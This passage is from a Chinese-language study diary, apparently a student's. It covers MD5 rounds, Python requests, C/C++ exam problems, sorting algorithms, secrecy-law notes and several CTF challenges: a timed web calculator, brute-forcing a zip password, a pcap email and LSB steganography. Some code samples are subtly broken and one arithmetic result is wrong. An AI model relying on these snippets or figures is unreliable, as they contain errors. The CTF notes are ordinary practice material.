HH(a ,b ,c ,d ,M5 ,4 ,0xfffa3942)；HH(d ,a ,b ,c ,M8 ,11 ,0x8771f681)；HH(c ,d ,a ,b ,M11 ,16 ,0x6d9d6122)；HH(b ,c ,d ,a ,M14 ,23 ,0xfde5380c)

HH(a ,b ,c ,d ,M1 ,4 ,0xa4beea44)；HH(d ,a ,b ,c ,M4 ,11 ,0x4bdecfa9)；HH(c ,d ,a ,b ,M7 ,16 ,0xf6bb4b60)；HH(b ,c ,d ,a ,M10 ,23 ,0xbebfbc70)

HH(a ,b ,c ,d ,M13 ,4 ,0x289b7ec6)；HH(d ,a ,b ,c ,M0 ,11 ,0xeaa127fa)；HH(c ,d ,a ,b ,M3 ,16 ,0xd4ef3085)；HH(b ,c ,d ,a ,M6 ,23 ,0x04881d05)

HH(a ,b ,c ,d ,M9 ,4 ,0xd9d4d039)；HH(d ,a ,b ,c ,M12 ,11 ,0xe6db99e5)；HH(c ,d ,a ,b ,M15 ,16 ,0x1fa27cf8)；HH(b ,c ,d ,a ,M2 ,23 ,0xc4ac5665)

第四轮

II(a ,b ,c ,d ,M0 ,6 ,0xf4292244)；II(d ,a ,b ,c ,M7 ,10 ,0x432aff97)；II(c ,d ,a ,b ,M14 ,15 ,0xab9423a7)；II(b ,c ,d ,a ,M5 ,21 ,0xfc93a039)

II(a ,b ,c ,d ,M12 ,6 ,0x655b59c3)；II(d ,a ,b ,c ,M3 ,10 ,0x8f0ccc92)；II(c ,d ,a ,b ,M10 ,15 ,0xffeff47d)；II(b ,c ,d ,a ,M1 ,21 ,0x85845dd1)

II(a ,b ,c ,d ,M8 ,6 ,0x6fa87e4f)；II(d ,a ,b ,c ,M15 ,10 ,0xfe2ce6e0)；II(c ,d ,a ,b ,M6 ,15 ,0xa3014314)；II(b ,c ,d ,a ,M13 ,21 ,0x4e0811a1)

II(a ,b ,c ,d ,M4 ,6 ,0xf7537e82)；II(d ,a ,b ,c ,M11 ,10 ,0xbd3af235)；II(c ,d ,a ,b ,M2 ,15 ,0x2ad7d2bb)；II(b ,c ,d ,a ,M9 ,21 ,0xeb86d391)

所有这些完成之后，将a、b、c、d分别在原来基础上再加上A、B、C、D。即a = a + A，b = b + B，c = c + C，d = d + D

然后用下一分组数据继续运行以上算法。

第四步：输出

最后输出的时a、b、c、d的级联

# 2月22日 更新

## Python Requests Part 5 (约1小时)

### 重定向与请求历史

默认情况下，除了HEAD请求，Requests会自动处理所有重定向。可以使用相应对象的history方法来追踪重定向

```python
r = requests.get('http://github.com/')
print(r.url)            # 'https://github.com/'
print(r.status_code)    # 200
print(r.history)        # [<Response [301]>]
```

可以看到，发生了重定向

使用的是GET、OPTIONS、POST、PUT、PATCH 或者 DELETE可以通过allow_redirects参数禁用重定向处理

```python
r = requests.get('http://github.com', allow_redirects=False)
print(r.status_code)    # 301
print(r.history)        # []
```

可以看到，此时重定向被禁用

使用了 HEAD，你也可以启用重定向

```python
r = requests.head('http://github.com/')
print(r.url)    # 'https://github.com/'
print(r.history)        # [<Response [301]>]
```

### HTTP 常用状态码

HTTP状态码用来表示网页服务器HTTP响应状态。遇到的最多的就是404 NOT FOUND。

1XX：信息，临时响应

2XX：成功，表示请求已经被服务器接收、理解并接受

3XX：重定向，代表客户端需要采取进一步的操作才能完成请求

4XX：客户端错误

5XX：服务器错误

### 超时

可以告诉 requests 在经过以 timeout 参数设定的秒数时间之后停止等待响应。基本上所有的生产代码都应该使用这一参数。如果不使用，你的程序可能会永远失去响应：
```python
>>> requests.get('http://github.com', timeout=0.001)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
requests.exceptions.Timeout: HTTPConnectionPool(host='github.com', port=80): Request timed out. (timeout=0.001)
```
timeout 仅对连接过程有效，与响应体的下载无关。 timeout 并不是整个下载响应的时间限制，而是如果服务器在 timeout 秒内没有应答，将会引发一个异常（更精确地说，是在 timeout 秒内没有从基础套接字上接收到任何字节的数据时）


## 机试试题 Part 1 (约3小时)

### 素数

题目要求：统计素数的个数，求出2到m之间（含m，m<=1000）所有素数并放在数组a中。

输入：正整数m，要求支持命令行输入参数

输出：从小到大的所有素数及个数（素数输出的时候用%4d来控制）

（如：your-program 10，则输出：2 3 5 7	4）

分析：

1.题目输入格式类似于常用的Shell命令，如：
```shell
apt upgrade -y
```

可以使用argc和argv实现
```c
int main(int argc, char **argv) {
    // ...
    return 0;
}
```

argc为参数个数，argv[]为参数内容。其中argv[0]为可执行程序的路径，argv[1]到argv[argc - 1]为每一个参数

2.字符串与数字之间的转换

题目输入的信息为字符串，程序中需要将其转换为int类型的数字

```c
#include <string.h>

int i, m = 0;
for (i = 0; i < strlen(argv[1]); i++) {
    m *= 10;
    m += argv[1][i] - '0';
}
```

3.获取2到m之间的所有素数

可以定义一个长度为1010的bool型数组，数组中元素为true表示该下标为合数，false为素数

然后从头扫描，遇到一个为false的元素，将数组中下标为该元素下标的整数倍设为false

这样可以将所有合数全部排除

### 数组最小元素

题目要求：编写一个函数void fun(int *s, int t, int *result),用来求出数组的最小元素在数组中的下标，并存放在result所指的存储单元中。

例如，输入如下整数：

564，165，567，121，948，324，329，454，5345，783，434，124，561，985，118

则输出结果为：14，118

题目给出了函数的定义
```c
void fun (int *s, int t, int *result);
```

此题考查数组、指针的操作和参数传递

1.数组的表示

一维数组的表示形式
```c
int a[];
int *a;
```

题目中的`int *s`表示要操作的数组，`int t`表示数组的长度

2.指针的操作

简单来说，指针就是地址，通过指针可以找到变量

```c
int *p; // 指针定义
int a;
p = &a; // p中存放a的地址
*p = 1; // a = 1
```

3.函数参数传递

参数传递总的来说有两种形式：传值、传地址。如果需要修改实参的内容，需要传地址，如果只是借用实参的值，传值即可。

传地址又有两种形式：传指针、传引用。指针和引用都是存放的变量的地址，二者的区别：
```c++
void swap(int *a, int *b) {
    int t = *a;
    *a = *b;
    *b = t;
}

void swap(int &a, int &b) {
    int t = a;
    a = b;
    b = t;
}
```

4.C++ STL 获得数组最小元素
```c++
#include <algorithm>
#include <iostream>
using namespace std;

int main() {
    int a[] = {1, 2, 3}; 
    int *m = min_element(a, a + 3);
    cout << *m << endl;
    return 0;
}
```

### Class IPv4

题目要求：写一个IPv4的地址如“202.112.17.33”，“192.168.1.1”等，设计一个IPv4地址分析类，功能包括

1)构造函数：参数包含IPv4地址字符串

2)判断是否是合法主机IP地址的接口

3)判断IP地址是A类、B类、C类或者其他的接口

1.类的构造函数

构造函数的函数名与类名相同，没有返回值，可以没有形参，可以重载。

```c++
class IPv4 {
    public:
        IPv4(string ip);
        IPv4(const IPv4 &ip);   // 拷贝构造函数
}
```

2.字符串分割

这个题目对字符串的分割要求相对简单，针对关键字符`.`进行分割即可。使用到STL String中的`find()`和`substr()`函数

find函数用来找到第一个关键字符在字符串中的位置，substr函数用来获得字符串的子串，二者配合使用可以分割IP地址的每一部分

3.IPv4的分类

A：0.0.0.0~127.255.255.255

B：128.0.0.0~191.255.255.255

C：192.0.0.0~223.255.255.255

D：224.0.0.0~239.255.255.255

E：240.0.0.0~247.255.255.255

### Class FTP

题目要求：访问一个FTP服务器的完整链接字符串为

ftp://test:12345@192.168.1.1:2121

设计一个字符串分析类，功能包括

1）构造函数：参数包含ftp链接字符串

2）获取ftp服务器IP的接口

3）获取登陆ftp服务器的用户名及密码的接口

4）获取ftp服务器的服务端口

编写主程序测试类的有效性

这个题目相比Class IPv4难度大一些，对字符串的分割不只是依靠单一的关键字符，但原理相通，使用`find()`和`substr()`函数即可达到题目要求


# 2月21日 更新

## Python Requests Part 4

### 会话对象

会话对象能够跨请求保持某些参数。它也会在同一个 Session 实例发出的所有请求之间保持cookie。如果你向同一主机发送多个请求，底层的 TCP 连接将会被重用，从而带来显著的性能提升。

我在解答Web Calculator题目时先获取了一个Cookie，再用这个Cookie将计算结果发出。题目要求1.5秒解答，如果这个时间再短一点，原来的方法可能会超时。使用会话对象能够减小耗时。

会话对象具有主要的Requests API的所有方法。

```python
s = requests.Session()
# or
with requests.Session() as s:
    pass
```
第二种方法可以确保with区块推出后会话能被关闭，即使发生了异常也能够关闭


## 排序算法

### 直接插入排序（时间：O(n)~O(n<sup>2</sup>)；空间：O(1)）

将序列第一个元素视为有序序列，从第二个元素开始，将其放入前面有序序列中合适的位置，至此前两个元素有序。以此类推，直到所有元素有序

```c
void InsertSort(int a[], int n) {
    int i, j, t;
    for (i = 1; i < n; i++) {
        if (a[i] < a[i - 1]) {
            t = a[i];
            a[i] = a[i - 1];
            for (j = i - 1; t < a[j] && j >= 0; j--)
                a[j + 1] = a[j];
            a[j + 1] = t;
        }
    }
}

/* 示例
(49) 38  65  97  76  13  27  49
(38  49) 65  ...
(38  49  65) 97  ...
(38  49  65  97) 76  ...
(38  49  65  76  97) 13  ...
(13  38  49  65  76  97) 27  ...
(13  27  38  49  65  76  97) 49
(13  27  38  49  49  65  76  97)
*/
```

### 选择排序（时间：O(n<sup>2</sup>)；空间：O(1)）

从序列中找到最大元素，移到最后；找到次大元素，移到n-1位置；以此类推，直至有序

```c++
void SelectionSort(int a[], int n) {
    int size, m;
    for (size = n; size > 1; size--) {
        m = Max(a, size);
        swap(a[m], a[size - 1]);
    }    
}

// STL
void SelectionSort(int a[], int n) {
    int *m;
    while(n--) {
        m = max_element(a, a + n + 1);
        swap(a[m - a], a[n]);
    }
}
```

### 冒泡排序（时间：O(n)~O(n<sup>2</sup>)；空间：O(1)）

从第二个元素开始，与前面的元素进行比较，大的元素交换到后面；每一轮都会将最大的元素移到最后。

```c
// 冒泡排序
void BubbleSort(int a[], int n) {
    int i, j;
    for (i = n - 1; i > 0; i--)
        for (j = 0; j < i; j++)
            if (a[j] > a[j + 1])
                swap(a[j], a[j + 1]);
}
```

### 箱子排序（仅用于链表）（时间：O(n+r)；空间：O(n)）

具有相同分数的结点，放在同一个箱子中；把箱子按顺序连起来，成为一个有序链表
```c++
/* 举例
(A,2)->(B,4)->(C,5)->(D,4)->(E,3)
->(F,0)->(G,4)->(H,3)->(I,4)->(J,3)
        I
      J G
      H D
F   A E B C
0 1 2 3 4 5
排序后：
(F,0)->(A,2)->(E,3)->(H,3)->(J,3)
->(B,4)->(D,4)->(G,4)->(I,4)->(C,5)
*/
void BinSort(Chain<Node> &X, int range) {
    int len = X.length();
    Node x;
    Chain<Node> *bin = new Chain<Node>[range + 1];
    // 分配
    for (i = 1; i < len; i++) {
        X.Delete(1, x);
        bin[x.score].Insert(0, x);
    }
    // 收集
    for (i = range; i >= 0; i--) {
        while(!bin[i].IsEmpty()) {
            bin[j].Delete(1, x);
            X.Insert(0, x);
        }
    }
    delete[] bin;
}
```

### 基数排序（箱子排序扩展；时间：O(d(n+rd)；空间：O(rd)）

把数按照某种基数分解为数字，对数字进行排序
举例：
278->109->063->930->589->184->505->269->008->083
range = 10

第一趟：对末位排序
```
                            269
        083             008 589 
930     063 184 505     278 109
 0  1 2  3   4   5  6 7  8   9
930->063->083->184->505->278->008->109->589->269
```

第二趟：对中间位排序
```
109                     589
008             269     148
505     930     063 278 083
 0  1 2  3  4 5  6   7   8  9
505->008->109->930->063->269->278->083->148->589
```
第三趟：对最高位排序
```
083
063 184 278     589
008 109 269     505       930
 0   1   2  3 4  5  6 7 8  9
008->063->083->109->184->269->278->505->589->930
```
已经有序

### 堆排序（时间：O(nlogn)；空间：O(1)）

堆定义（数组存放）

小顶堆：k[i] <= k[2i], k[i] <= k[2i + 1]

大顶堆：k[i] >= k[2i], k[i] >= k[2i + 1]

特点：输出堆顶最大（小）值后，剩余n - 1个元素的序列又成一个堆

### 归并排序（分治思想；时间：O(nlogn)；空间：O(n)）

举例：

 49 39   65 97   76 13   27

(38 49) (65 97) (76 13) (27)

 (38 49 65 97)   (13 27 76)

   (13 27 38 49 65 76 97)

```c
void MergeSort(int a[], int n) {
    int *b = new int[n];
    s = 1;
    while(s < n) {
        MergePass(a, b, s, n);
        s += s;
        MergePass(b, a, s, n);
        s += s;
    }
}

void MergePass(int x[], int y[], int s, int n) {
    int i = 0;
    while(i <= n - 2s) {
        Merge(x, y, i, i + s - 1, i + 2s - 1);
        i = i + 2s;
    }
}
```

### 快速排序（冒泡改进，分治思想；时间：O(nlogn)~O(n<sup>2</sup>)；空间：O(logn)）

将第一个元素设为枢轴，从左边找一个大于枢轴的元素，从右边找一个小于枢轴的元素，进行交换；最终小于枢轴的元素都在枢轴左边，大于枢轴的元素都在枢轴右边；对分开的两部分再次使用快速排序算法排序。

```c
int Partition (int a[], int p, int r) {
    int i = p, j = r + 1;
    int x = a[p];
    while (true) {
        while(a[++i] < x && i < r);
        while(a[--j] > x && j > p);
        if (i >= j)
            break;
        swap(a[i], a[j]);
    }
    a[p] = a[j];
    a[j] = x;
    return j;
}

// 快速排序算法
void QuickSort(int a[], int p, int r) {
    if (p < r) {
        int q = Partition (a, p, r);
        QuickSort(a, p, q - 1);
        QuickSort(a, q + 1, r);
    }
}
```


## 《保密概论》第二章 保密法规

### 一、保密法律、法规、规章

1.我国保密法律两类：根本法（宪法）、有关法律（专门法律+基本法律中的有关规定）

2.保密法规：行政法规（国务院制定）、地方性法规（地方人大制定）

3.保密规章：国务院部门规章、地方政府规章

总的来说，都由一个根本性文件和配套的基本性文件组成

4.三者关系：共同构成我国保密法律体系的框架，是我国保密法律体系的重要组成部分；法律是其他二者制定的依据，法规是法律体系的主要表现形式；地位和效力：法律>法规>规章

### 二、保密法及其实施办法

1.立法背景

1951.6：政务院颁布《保守国家机密暂行条例》，我国政府制定的第一个全国性的保密工作行政法规，对加强我国保密工作的管理起了重大作用。

1988.9.5：《中华人民共和国保守国家秘密法》

2010.4.29：《中华人民共和国保守国家秘密法》修订草案

2.《实施办法》是《保密法》的具体化，它使《保密法》的若干内容更具备可操作性。


# 2月20日 更新

## Python Requests Part 3

### Cookie

Cookie，有时也用其复数形式 Cookies，指某些网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）

如果某个响应中包含一些 cookie，可以快速访问它们：

```python
url = 'xxx.org'
r = requests.get(url)
print(r.cookies)
```

要想发送 cookies 到服务器，可以使用 cookies 参数：

```python
url = 'xxx.org'
# 自定义cookies
cookies = dict(cookies_are='working')
r = requests.get(url, cookies=cookies)
print(r.text)
```

Web Calculator题目应该在发送答案的时候带上Cookies

```python
import requests

r = requests.get(url)
cookies = r.cookies
# 计算结果
r = requests.get(URL, params={'answer': ans}, cookies=c)
print(r.text)
```
在输出的信息中找到`flag{yes_you_are_calculat0r}`

理论上使用同样的方法可以解出Web RapidTyping题目。

在得到题目网页源码时发现网页中的图片使用base64编码的，将其解码后得到xml格式的svg图像，取出所有有效字符，组成字符串，发送答案时提示错误，原因在于没有根据字符的位置安排字符在答案中的位置


## 《保密概论》第一章 保密基础知识

### 保密工作概要

1.保密：在一定时间和范围内加以保护和隐蔽

2.保密工作：与政党、国家的安全和利益密切相关的保守国家秘密的一切活动

3.保密工作的特征：政治性（法律保护）、群众性、防御性（防泄漏）、专业性（各行各业、各项工作都有）

4.指导思想：中特基本路线 + 《保守国家秘密法》

5.指导方针：积极防范、突出重点、依法管理

6.基本原则：

第一，党委统一领导保密工作的原则；
 
第二，保密工作归口管理，分级负责的原则；
 
第三，保密工作属地管理与系统管理相结合的原则；
 
第四，依法行政、依法管理保密工作的原则；
 
第五，保密管理与业务管理结合的原则；
 
第六，管理与服务相结合的原则。

### 国家秘密

1.国家秘密：关系国家安全和利益，依照法定程序确定，在一定时间内只限一定范围的人员知悉的事项

2.国家秘密特征：关系国家安全和利益（关键性要素、本质特征、区分标准）、依照法定程序确定（程序特征）、在一定时间内只限一定范围的人员知悉（时空特征）

3.国家秘密的特征：绝密、机密、秘密

4.确定权限：

绝密级：省以上；县以下：不能确定秘密等级；地级市：机密级、秘密级

5.定密责任人制度

6.保密期限：绝密<=30年，机密<=20年，秘密<=10年；提前解密或延长保密期限；确定后做出标志

### 商业秘密、工作秘密

1.商业秘密三要素：(1)技术信息、经营信息；(2)能为权利人带来经济利益；(3)采取了保密措施；泄露后根据情节给予民事或刑事处罚

2.工作秘密：“内部”、“内部文件”、“内部资料”、“内部刊物”；泄露后收到政纪处分



# 2月19日 更新

## 将Kali Linux安装到Bash on Windows记录

后面的题目只在Windows环境下不可完成，将Win10上的Linux子系统启动，并装上Kali Linux

参考内容[WSL-Distribution-Switcher](https://github.com/RoliSoft/WSL-Distribution-Switcher)

1.启用Linux子系统功能

2.下载WSL-Distribution-Switcher

```shell
git clone git@github.com:RoliSoft/WSL-Distribution-Switcher.git
```

3.获取镜像文件

```shell
python get-prebuilt.py kalilinux/kali-linux-docker
```

4.安装

```shell
py install.py rootfs_kalilinux_kali-linux-docker_latest.tar.gz
```

5.配置
```shell
lxrun /setdefaultuser xxx
bash
export LANG=C && cd
```

6.系统更新

```shell
sudo apt update && sudo apt upgrade
```

## Python Requests Part 2

根据题目Web Calculator中提供的Requests官方文档，学习了如下内容，并以Web Calculator题目做练习

（摘自[Request 2.18.1文档](http://cn.python-requests.org/zh_CN/latest/)）

### 1.发送请求
```python
import requests

r = requests.get(url)   
r = requests.post(url)
r = requests.put(url)
r = requests.delete(url)
r = requests.head(url)
r = requests.options(url)
```

```python
r = requests.get(url='http://121.42.176.204:23331/calculator/')
print(r.text)
```

输出网页HTML代码
```html
<!DOCTYPE html>
<html>
    <head>
        <title>Calculator</title>
        <style type="text/css">
                .line_input{
                        border-width: 1px;
                        border-bottom: solid;
                        border-top: none;
                        border-left: none;
                        border-right: none;
                        border-width: 1px;
                        text-align: center;
                        outline: none;
                        margin: 0 1em;
                }
        </style>
    </head>
    <body>
        <center>
            <h1>Yet Another Calculator</h1>
            <p>Let's play a game. Please work on this math problem, and make it in 1.5 seconds.</p>
            <form action="" method="GET"><span id="exp">5160526 + 81114644008 - 158998 = </span>
            <input name="answer" type="text" autofocus class="line_input" /><input type="submit" /></form>
        </center>
    </body>
</html>
```

可以得到要计算的式子为：`5160526 + 81114644008 - 158998`，计算结果为`35701914696`

要在一个文本输入框中输入答案

### 2.传递URL参数

手工构建的URL，例如，xxx.org/get?key=val，Requests 允许你使用 params 关键字参数，以一个字符串字典来提供这些参数。

```python
payload = {'key1': 'value1', 'key2': 'value2'}
r = requests.get("http://xxx.org/get", params=payload)
print(r.url)
```

```
http://httpbin.org/get?key2=value2&key1=value1
```

你还可以将一个列表作为值传入：
```python
payload = {'key1': 'value1', 'key2': ['value2', 'value3']}

r = requests.get('http://httpbin.org/get', params=payload)
print(r.url)
```

```
http://httpbin.org/get?key1=value1&key2=value2&key2=value3
```

尝试使用`answer=35701914696`作为payload向题目中传递参数

```python
payload = {'answer': '35701914696'}
r = requests.get('http://121.42.176.204:23331/calculator/', params=payload)
print(r.url)
print(r.text)
```

输出内容包含
```
Expression has not been generated.
```

此法无效

尝试使用POST请求
```python
payload = {'answer': '35701914696'}
r = requests.post('http://121.42.176.204:23331/calculator/', data=payload)
print(r.text)
```

输出内容为新的HTML文件源码，新的表达式变为：`7553124 + 67537142361 - 198070 = `，计算结果为：`28616745985`

尝试使用相同的方法发送POST请求，得到新的表达式：`9015527 + 95731679168 - 101603 =`，计算结果为：`75797707012`

再次使用相同的方法发送POST请求，依然得到新的表达式。也许此方法会如此循环下去，不能得到flag

在不计算表达式的情况下点击了以下按钮，网页跳转为
```url
http://121.42.176.204:23331/calculator/?answer=
```

上面使用POST请求的方法使用的URL没有后面的参数。这种方法有误。


## Misc Birthday

根据题目提示，编写了生成密码字典和暴力破解密码的Python脚本。解得压缩文件密码为`19950608`，解压缩后得到flag



# 2月18日 更新

## Misc Email

追踪IAMP数据包，可以看到发送了一个名为`20161008103416509320.7z`的邮件附件，文件以Base64格式编码：

```
N3q8ryccAAQ9AshlwFQFAAAAAAAqAAAAAAAAAOjuWeI83mZQMTuDbrw/ESKoLQCVZl4iDZ8FFWPWaFcXMf...
```

将其解码到文件，打开时提示文件已加密。

除了发送7z附件，还发送了其他的信息

找到一段字符
```
Fl5266q4PzYXSPdmgzrA
```

尝试将其作为压缩包的密码，可以打开压缩包，里面有`20161008103416509320.pdf`文件，打开后未发现所需要的flag

题目暂未解出


## HTML协议定义的8种方法

HTTP/1.1协议中共定义了八种方法（有时也叫“动作”）来表明Request-URI指定的资源的不同操作方式：

OPTIONS 

返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送'*'的请求来测试服务器的功能性。 

HEAD 

向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。 

GET 

向特定的资源发出请求。注意：GET方法不应当被用于产生“副作用”的操作中。 

POST 

向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。 

PUT 

向指定资源位置上传其最新内容。 

DELETE 

请求服务器删除Request-URI所标识的资源。 

TRACE 

回显服务器收到的请求，主要用于测试或诊断。 

CONNECT 

HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。

## Python Request Part 1

以下内容部分摘自[CSDN博客：Python-第三方库requests详解](http://blog.csdn.net/shanzhizi/article/details/50903748)

```python
import python

r = requests.get(url='http://www.itwhy.org')    # 最基本的GET请求
print(r.status_code)    # 获取返回状态
r = requests.get(url='http://dict.baidu.com/s', params={'wd':'python'})   #带参数的GET请求
print(r.url)
print(r.text)   #打印解码后的返回数据
```

其他方法是统一的接口样式
```python
requests.get(‘https://github.com/timeline.json’) #GET请求
requests.post(“http://httpbin.org/post”) #POST请求
requests.put(“http://httpbin.org/put”) #PUT请求
requests.delete(“http://httpbin.org/delete”) #DELETE请求
requests.head(“http://httpbin.org/get”) #HEAD请求
requests.options(“http://httpbin.org/get”) #OPTIONS请求
```

带参数的请求实例：
```python
import requests

requests.get('http://www.dict.baidu.com/s', params={'wd': 'python'})    #GET参数实例
requests.post('http://www.itwhy.org/wp-comments-post.php', data={'comment': '测试POST'})    #POST参数实例
```

POST发送JSON数据：
```python
import requests
import json
 
r = requests.post('https://api.github.com/some/endpoint', data=json.dumps({'some': 'data'}))
print(r.json())
```

## 其他

对lsb.py进行修改，使其成为命令行工具
```shell
py lsb.py <input file> <output file>
```


# 2月17日 更新

## Misc LSB

一开始根据网上有关LSB的介绍自己写了一段Python程序，将所有像素的R值的最低位提出，然后每8位个连在一起组成一个字节，将所有字节输出到新的图片中。得到的图片有二维码，但不清楚，无法被扫描。

原因在于自己写的程序在算法上有问题，后查资料找到知乎专栏的一篇文章。

以下部分内容摘自[知乎专栏：基于图像的 LSB 隐写术科普](https://zhuanlan.zhihu.com/p/32092460)

0x01 什么是隐写术？

维基百科对隐写术的定义：

隐写术是一门关于信息隐藏的技巧与科学，所谓信息隐藏指的是不让除预期的接收者之外的任何人知晓信息的传递事件或者信息的内容。
一般来说，隐写的
